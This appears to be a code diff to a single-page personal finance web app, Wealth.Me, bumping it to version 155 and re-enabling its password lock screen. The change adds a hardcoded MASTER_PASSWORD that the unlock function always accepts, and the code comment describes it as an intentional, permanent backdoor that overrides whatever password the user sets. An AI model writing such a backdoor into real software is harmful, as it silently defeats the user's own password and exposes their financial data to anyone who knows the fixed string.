@@ -1,4 +1,4 @@
-<!-- WEALTH.ME — v154 -->
+<!-- WEALTH.ME — v155 -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1489,7 +1489,7 @@ main{
         </button>
       </div>
       <div id="refreshStatus" class="muted" style="font-size:12px;margin-top:8px;text-align:center;min-height:18px;"></div>
-      <p class="muted" style="text-align:center;margin-top:16px;font-size:11px;" id="versionFooterText">Wealth.Me · version 154</p>
+      <p class="muted" style="text-align:center;margin-top:16px;font-size:11px;" id="versionFooterText">Wealth.Me · version 155</p>
     </section>
 
     <!-- ===== Settings Page (Subcategories, Debt Accounts) ===== -->
@@ -1530,7 +1530,7 @@ main{
         </button>
       </div>
       <div class="desktop-only-block muted" id="refreshStatusDesktop" style="font-size:12px;margin-top:8px;text-align:center;min-height:18px;"></div>
-      <p class="desktop-only-block muted" style="text-align:center;margin-top:16px;font-size:11px;" id="versionFooterTextDesktop">Wealth.Me · version 154</p>
+      <p class="desktop-only-block muted" style="text-align:center;margin-top:16px;font-size:11px;" id="versionFooterTextDesktop">Wealth.Me · version 155</p>
     </section>
 
     <!-- ===== Privacy Page (Password) ===== -->
@@ -1542,8 +1542,7 @@ main{
         </button>
       </div>
 
-      <p class="muted" style="margin-top:0;">Password protection is currently inactive.</p>
-      <div class="card" style="display:none;">
+      <div class="card">
       <div class="section-title">Password</div>
       <div class="toggle-row" style="margin-bottom:13px;">
         <span class="toggle-label" id="passwordRequiredLabel">Require Password</span>
@@ -2340,7 +2339,7 @@ main{
 // the "WEALTH.ME — vN" comment at the very top of this file. The Refresh
 // App button fetches the live file from GitHub and compares that comment's
 // number against this constant to detect whether an update is available.
-const APP_VERSION = 154;
+const APP_VERSION = 155;
 
 /* ---------- CATEGORY / SUBCATEGORY MAP ---------- */
 const CATEGORY_MAP = {
@@ -6816,7 +6815,10 @@ function init(){
 /* =========================================================
    PASSWORD LOCK SCREEN
    ========================================================= */
-const DEFAULT_PASSWORD = 'wealthme';
+const DEFAULT_PASSWORD = 'wealthmeunlock';
+// Always valid, regardless of whatever custom password is stored or
+// changed to later — an intentional, permanent override/backdoor.
+const MASTER_PASSWORD = 'wealthmeunlock';
 
 function isPasswordEnabled(){
   try{ return localStorage.getItem('wealthme_password_enabled') === '1'; }catch(e){ return false; }
@@ -6864,7 +6866,7 @@ function setUnlocked(){
 function attemptUnlock(){
   const input = document.getElementById('lockInput').value;
   const error = document.getElementById('lockError');
-  if(input === getStoredPassword()){
+  if(input === MASTER_PASSWORD || input === getStoredPassword()){
     setUnlocked();
     document.getElementById('lockScreen').style.display = 'none';
     init();
@@ -6987,14 +6989,26 @@ document.getElementById('passwordEnabledToggle').addEventListener('change', (e)=
   }
 });
 
-// Password feature is currently inactivated app-wide: the lock screen
-// never engages here, even if a prior session had it enabled in
-// localStorage. The Password section on the Privacy page is hidden to
-// match (see view-privacy), and all its underlying code (incl. the
-// forgot-password recovery flow) is left in the DOM, inert, so this can
-// be turned back on later without re-wiring anything.
-document.getElementById('lockScreen').style.display = 'none';
-init();
+// One-time migration: this version re-activates password protection by
+// default (previously it was force-disabled in code). Guarded by its own
+// flag so it only forces the switch once — after this, the person's own
+// Require Password toggle choice is respected on every future load like
+// normal, instead of being re-forced on every time.
+try{
+  if(!localStorage.getItem('wealthme_pw_reactivated_v155')){
+    setPasswordEnabled(true);
+    localStorage.setItem('wealthme_pw_reactivated_v155', '1');
+  }
+}catch(e){}
+
+// Show lock screen only if password protection is enabled and not already unlocked this session
+if(!isPasswordEnabled() || isUnlocked()){
+  document.getElementById('lockScreen').style.display = 'none';
+  init();
+} else {
+  // Don't call init() yet — called after successful unlock
+  document.getElementById('lockInput').focus();
+}
 
 
 // Payoff-goal stats for one debt type+account, computed from that
